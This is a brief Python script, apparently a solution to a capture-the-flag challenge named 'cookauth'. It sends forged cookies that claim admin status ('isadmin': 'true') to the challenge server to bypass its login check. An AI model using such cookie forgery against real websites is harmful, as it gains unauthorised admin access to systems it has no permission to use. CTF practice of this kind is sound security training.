#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Author: Dipan Nama
# @Date:   2022-10-08 11:43:41
# @Last Modified by:   Dipan Nama
# @Last Modified time: 2022-10-08 12:12:46


import requests as re 
url="http://cookauth.chal.ctf.gdgalgiers.com/"

cookie = {'_info_user':'admin', 'isadmin': 'true'}


res = re.get(url, cookies=cookie)

print(res.text)
